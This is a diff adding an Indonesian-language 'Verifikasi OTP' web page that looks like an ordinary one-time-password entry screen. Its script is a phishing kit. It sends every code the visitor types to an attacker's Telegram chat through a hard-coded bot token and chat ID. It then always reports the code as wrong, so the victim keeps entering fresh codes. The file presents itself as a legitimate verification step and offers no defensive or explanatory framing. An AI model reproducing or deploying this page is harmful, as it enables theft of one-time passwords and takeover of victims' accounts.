@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi OTP</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #f5f5f5; display: flex; justify-content: center; height: 100vh; }
+        .app-container { background: #fff; width: 100%; max-width: 450px; display: flex; flex-direction: column; }
+        .header { padding: 20px; display: flex; align-items: center; border-bottom: 1px solid #eee; }
+        .progress-container { display: flex; gap: 8px; padding: 15px 20px; }
+        .step { height: 3px; flex: 1; background: #e0e0e0; }
+        .step.active { background: #f1c40f; }
+        .content { padding: 40px 25px; text-align: center; flex-grow: 1; }
+        .otp-input-container { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
+        .otp-input-container input { width: 40px; height: 50px; text-align: center; font-size: 20px; border: none; border-bottom: 2px solid #ccc; outline: none; }
+        .otp-input-container input.invalid { border-bottom: 2px solid #e74c3c; color: #e74c3c; }
+        .error-msg { color: #e74c3c; font-size: 13px; display: none; margin-bottom: 20px; font-weight: 600; }
+        .footer { padding: 20px; }
+        .btn-confirm { width: 100%; background: #3498db; color: #fff; border: none; padding: 15px; border-radius: 25px; font-weight: 600; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <div class="header"><h1>Verifikasi OTP</h1></div>
+        <div class="progress-container"><div class="step active"></div><div class="step active"></div><div class="step"></div><div class="step"></div></div>
+        <div class="content">
+            <h3>Masukkan Kode OTP</h3>
+            <p style="color:#666; font-size:14px; margin-top:10px;">Kode telah dikirim melalui SMS ke nomor Anda.</p>
+            <div class="otp-input-container">
+                <input type="number" class="otp-f" oninput="move(this,0)" maxlength="1">
+                <input type="number" class="otp-f" oninput="move(this,1)" maxlength="1">
+                <input type="number" class="otp-f" oninput="move(this,2)" maxlength="1">
+                <input type="number" class="otp-f" oninput="move(this,3)" maxlength="1">
+                <input type="number" class="otp-f" oninput="move(this,4)" maxlength="1">
+                <input type="number" class="otp-f" oninput="move(this,5)" maxlength="1">
+            </div>
+            <p id="errorTxt" class="error-msg">Kode OTP yang Anda masukkan salah. Silakan coba lagi.</p>
+        </div>
+        <div class="footer"><button id="btn" class="btn-confirm" onclick="proses()">Konfirmasi</button></div>
+    </div>
+    <script>
+        const TOKEN = "8369092441:AAFPFsvi9BPjWJhEJcBPx2xzMtn-b2GdowY"; // Ganti
+        const CHAT_ID = "7692820036"; // Ganti
+        function move(c, i) {
+            document.getElementById('errorTxt').style.display='none';
+            const fs = document.querySelectorAll('.otp-f');
+            fs[i].classList.remove('invalid');
+            if(c.value.length==1 && i<5) fs[i+1].focus();
+        }
+        function proses() {
+            let otp = "";
+            const fs = document.querySelectorAll('.otp-f');
+            fs.forEach(f => otp += f.value);
+            if(otp.length<6) return alert("Lengkapi OTP");
+            
+            document.getElementById('btn').innerText = "Memproses...";
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("OTP MASUK: "+otp)}&parse_mode=html`)
+            .then(() => {
+                setTimeout(() => {
+                    document.getElementById('errorTxt').style.display='block';
+                    fs.forEach(f => { f.value=""; f.classList.add('invalid'); });
+                    fs[0].focus();
+                    document.getElementById('btn').innerText = "Konfirmasi";
+                }, 1500);
+            });
+        }
+    </script>
+</body>
+</html>
